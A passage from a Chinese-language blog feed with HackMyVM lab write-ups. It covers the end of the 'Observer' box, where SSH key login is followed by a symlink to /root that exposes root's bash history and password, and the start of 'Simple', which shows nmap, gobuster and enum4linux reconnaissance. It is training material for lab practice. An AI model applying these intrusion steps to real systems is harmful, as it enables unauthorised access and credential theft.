@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 <span class="token keyword">for</span> <span class="token string">'id_rsa'</span> are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key <span class="token string">"id_rsa"</span><span class="token builtin class-name">:</span> bad permissions
jan@192.168.56.153's password: 

                                                                                                                                                                     
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># chmod 600 id_rsa </span>
                                                                                                                                                                     
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh jan@192.168.56.153 -i id_rsa</span>
Linux observer <span class="token number">6.1</span>.0-11-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr <span class="token number">16</span> <span class="token number">14</span>:05:12 <span class="token number">2024</span> from <span class="token number">192.168</span>.56.104
jan@observer:~$ </code></pre>
<p>直接拿到了jan的权限</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><p>sudo -l确实有东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">jan@observer:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> jan on observer:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User jan may run the following commands on observer:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/systemctl <span class="token parameter variable">-l</span> status</code></pre>
<p>但是我利用的时候出现了问题，发现并不能直接输入!bash或者!sh拿到root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">jan@observer:~$ <span class="token function">sudo</span> /usr/bin/systemctl <span class="token parameter variable">-l</span> status
● observer
    State: running
    Units: <span class="token number">236</span> loaded <span class="token punctuation">(</span>incl. loaded aliases<span class="token punctuation">)</span>
     Jobs: <span class="token number">0</span> queued
   Failed: <span class="token number">0</span> <span class="token function">units</span>
    Since: Tue <span class="token number">2024</span>-04-16 <span class="token number">13</span>:43:02 CEST<span class="token punctuation">;</span> 49min ago
  systemd: <span class="token number">252.12</span>-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─315 /usr/sbin/cron <span class="token parameter variable">-f</span>
           │ │ ├─322 /usr/sbin/CRON <span class="token parameter variable">-f</span>
           │ │ ├─333 /bin/sh <span class="token parameter variable">-c</span> /opt/observer
           │ │ └─336 /opt/observer
           │ ├─dbus.service
           │ │ └─318 /usr/bin/dbus-daemon <span class="token parameter variable">--system</span> <span class="token parameter variable">--address</span><span class="token operator">=</span>systemd: <span class="token parameter variable">--nofork</span> <span class="token parameter variable">--nopidfile</span> --systemd-activation --syslog-only
           │ ├─ifup@enp0s3.service
           │ │ └─416 dhclient <span class="token parameter variable">-4</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-pf</span> /run/dhclient.enp0s3.pid <span class="token parameter variable">-lf</span> /var/lib/dhcp/dhclient.enp0s3.leases <span class="token parameter variable">-I</span> <span class="token parameter variable">-df</span> /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
           │ ├─ssh.service
           │ │ └─410 <span class="token string">"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"</span>
           │ ├─system-getty.slice
           │ │ └─getty@tty1.service
           │ │   └─344 /sbin/agetty <span class="token parameter variable">-o</span> <span class="token string">"-p -- <span class="token entity" title="\\">\\</span>u"</span> <span class="token parameter variable">--noclear</span> - linux
           │ ├─systemd-journald.service
           │ │ └─207 /lib/systemd/systemd-journald
           │ ├─systemd-logind.service
           │ │ └─323 /lib/systemd/systemd-logind
           │ ├─systemd-timesyncd.service
           │ │ └─255 /lib/systemd/systemd-timesyncd
           │ └─systemd-udevd.service
           │   └─udev
           │     └─239 /lib/systemd/systemd-udevd
           └─user.slice
             └─user-1000.slice
               ├─session-2.scope
               │ ├─518 <span class="token string">"sshd: jan [priv]"</span>
               │ ├─533 <span class="token string">"sshd: jan@pts/0"</span>
               │ ├─534 <span class="token parameter variable">-bash</span>
               │ ├─551 /usr/bin/systemctl <span class="token parameter variable">-l</span>
               │ ├─552 pager
               │ ├─553 <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token string">"/bin/bash -c bash"</span>
               │ ├─554 <span class="token function">bash</span>
               │ ├─643 <span class="token function">su</span> root
               │ └─644 <span class="token function">bash</span>
               ├─session-5.scope
               │ ├─670 <span class="token string">"sshd: jan [priv]"</span>
               │ ├─676 <span class="token string">"sshd: jan@pts/1"</span>
               │ ├─677 <span class="token parameter variable">-bash</span>
               │ ├─687 <span class="token function">sudo</span> /usr/bin/systemctl <span class="token parameter variable">-l</span> status
               │ ├─688 <span class="token function">sudo</span> /usr/bin/systemctl <span class="token parameter variable">-l</span> status
               │ ├─689 /usr/bin/systemctl <span class="token parameter variable">-l</span> status
               │ └─690 <span class="token function">less</span>
               └─user@1000.service
                 └─init.scope
                   ├─521 /lib/systemd/systemd <span class="token parameter variable">--user</span>
                   └─523 <span class="token string">"(sd-pam)"</span></code></pre>
<p>这里提权巧妙，也是试了好多次才出来</p>
<h3 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h3><pre class="language-bash" data-language="bash"><code class="language-bash">jan@observer:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwx------ <span class="token number">4</span> jan  jan  <span class="token number">4096</span> abr <span class="token number">16</span> <span class="token number">14</span>:34 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> ago <span class="token number">21</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> jan  jan   <span class="token number">133</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> jan  jan   <span class="token number">220</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> jan  jan  <span class="token number">3526</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .bashrc
drwxr-xr-x <span class="token number">3</span> jan  jan  <span class="token number">4096</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> jan  jan   <span class="token number">807</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> jan  jan  <span class="token number">4096</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .ssh
-rw------- <span class="token number">1</span> jan  jan    <span class="token number">24</span> ago <span class="token number">21</span>  <span class="token number">2023</span> user.txt
-rw------- <span class="token number">1</span> jan  jan    <span class="token number">54</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .Xauthority</code></pre>
<p>我是看到jan用户可以读取.bash_history就想可不可以软连接到&#x2F;root&#x2F;.bash_history,事实证明确实可以<br>直接软连接到&#x2F;bash&#x2F;.bash_hitory不行，软连接到&#x2F;root然后在web中访问目录就能拿到root的历史指令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">jan@observer:~$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /root root
jan@observer:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwx------ <span class="token number">4</span> jan  jan  <span class="token number">4096</span> abr <span class="token number">16</span> <span class="token number">14</span>:37 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> ago <span class="token number">21</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> jan  jan   <span class="token number">133</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> jan  jan   <span class="token number">220</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> jan  jan  <span class="token number">3526</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .bashrc
drwxr-xr-x <span class="token number">3</span> jan  jan  <span class="token number">4096</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> jan  jan   <span class="token number">807</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .profile
lrwxrwxrwx <span class="token number">1</span> jan  jan     <span class="token number">5</span> abr <span class="token number">16</span> <span class="token number">14</span>:37 root -<span class="token operator">></span> /root
drwx------ <span class="token number">2</span> jan  jan  <span class="token number">4096</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .ssh
-rw------- <span class="token number">1</span> jan  jan    <span class="token number">24</span> ago <span class="token number">21</span>  <span class="token number">2023</span> user.txt
-rw------- <span class="token number">1</span> jan  jan    <span class="token number">54</span> ago <span class="token number">21</span>  <span class="token number">2023</span> .Xauthority</code></pre>
<p><img src="https://img2.imgtp.com/2024/04/16/Rudnh1u5.png" alt="1713271118137.png" loading="lazy"><br>历史指令泄露了root的密码，用这个密码直接su到root就拿到了root了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">jan@observer:~$ <span class="token function">su</span> root
Contraseña: 
root@observer:/home/jan<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>


]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>软连接</tag>
        <tag>用户名fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Simple</title>
    <url>/posts/54a57065/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.197</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:ec:66:85       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.197  08:00:27:6b:a0:17       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.012</span> seconds <span class="token punctuation">(</span><span class="token number">127.24</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> <span class="token parameter variable">-oN</span>  simple.txt <span class="token number">192.168</span>.56.197 
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-15 08:57 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.197
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00037s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65523</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token operator">|</span>_http-title: Simple
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:6B:A0:17 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span>_nbstat: NetBIOS name: SIMPLE, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:6b:a0:17 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
<span class="token operator">|</span>_clock-skew: 5h59m54s
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-07-15T07:09:45
<span class="token operator">|</span>_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">742.36</span> seconds
</code></pre>
<p>port 80 135 139 445 open,that’s SMB server</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/07/15/OR58MN.png" alt="OR58MN.png" loading="lazy"><br>得到了一些用户名,<code>ruy, marcos, lander, bogo, vaiper</code>,看了一下，网站没有什么功能点，所以扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.56.197/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.197/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1481</span><span class="token punctuation">]</span>
/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">163</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.197/images/<span class="token punctuation">]</span>
/Images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">163</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.197/Images/<span class="token punctuation">]</span>
/Index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1481</span><span class="token punctuation">]</span>
/fonts                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">162</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.197/fonts/<span class="token punctuation">]</span>
/IMAGES               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">163</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.197/IMAGES/<span class="token punctuation">]</span>
/INDEX.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">1481</span><span class="token punctuation">]</span>
/Fonts                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">162</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.197/Fonts/<span class="token punctuation">]</span>
/*checkout*           <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/*docroot*            <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/*                    <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/http%3A%2F%2Fwww     <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/http%3A              <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/q%26a                <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/**http%3a            <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/*http%3A             <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/**http%3A            <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/http%3A%2F%2Fyoutube <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/http%3A%2F%2Fblogs   <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/http%3A%2F%2Fblog    <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/**http%3A%2F%2Fwww   <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
/s%26p                <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3640</span><span class="token punctuation">]</span>
Progress: <span class="token number">613679</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">46.37</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">614093</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">46.40</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>也没有扫出来什么东西,网站大概没有什么东西,转向SMB服务。</p>
<h2 id="SMB-探测"><a href="#SMB-探测" class="headerlink" title="SMB 探测"></a>SMB 探测</h2><p>尝试枚举一些用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> enum4linux <span class="token parameter variable">-a</span> <span class="token number">192.168</span>.56.197
Starting enum4linux v0.9.1 <span class="token punctuation">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="token punctuation">)</span> on Mon Jul <span class="token number">15</span> 09:05:26 <span class="token number">2024</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Target Information <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Target <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token number">192.168</span>.56.197
RID Range <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token number">500</span>-550,1000-1050
Username <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Password <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Known Usernames <span class="token punctuation">..</span> administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Enumerating Workgroup/Domain on <span class="token number">192.168</span>.56.197 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got domain/workgroup name: WORKGROUP


